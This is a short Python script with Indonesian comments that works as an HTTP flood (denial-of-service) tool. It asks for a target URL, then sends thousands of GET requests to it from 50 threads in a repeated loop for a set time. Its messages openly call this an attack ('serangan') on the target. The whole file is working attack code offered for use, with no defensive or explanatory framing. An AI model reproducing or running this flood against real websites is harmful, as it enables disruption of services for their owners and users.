import sys
import time
import socket
import threading
import requests

# Interaksi user untuk URL target
url = str(input("Masukan url : "))  

def serang():
    try:
        response = requests.get(url=url)  # Memanggil fungsi user input
        print(f"Request berhasil : {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

def gass(req, num_threads):
    threads = []
    
    # Fungsi yang akan dijalankan oleh setiap thread
    def cnn():
        for _ in range(req):
            serang()

    # Membuat thread
    for i in range(num_threads):
        thread = threading.Thread(target=cnn)
        thread.start()
        threads.append(thread)

    # Menunggu semua thread selesai
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    req = 100  # Jumlah request per thread
    num_threads = 50  # Jumlah thread

    attack_duration = 10  # Durasi serangan dalam detik
    end_time = time.time() + attack_duration

    print(f"Melakukan serangan ke: {url} selama: {attack_duration} detik")

    # Loop untuk menjalankan serangan sampai waktu yang ditentukan
    while time.time() < end_time:
        gass(req, num_threads)
        # time.sleep(0.1)  # Jika ingin lebih cepat, bisa dihilangkan atau diatur lebih kecil

    print("Serangan selesai!")
